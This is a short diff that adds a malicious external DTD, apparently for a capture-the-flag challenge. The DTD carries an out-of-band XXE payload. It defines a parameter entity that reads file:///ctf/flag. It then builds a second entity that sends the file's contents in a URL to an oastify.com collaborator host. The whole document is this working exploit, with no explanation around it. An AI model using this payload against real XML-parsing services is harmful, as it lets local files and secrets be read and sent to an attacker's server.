@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///ctf/flag">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://hxi87wq6fwjqvm7n5dl6af6iz950tsugj.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
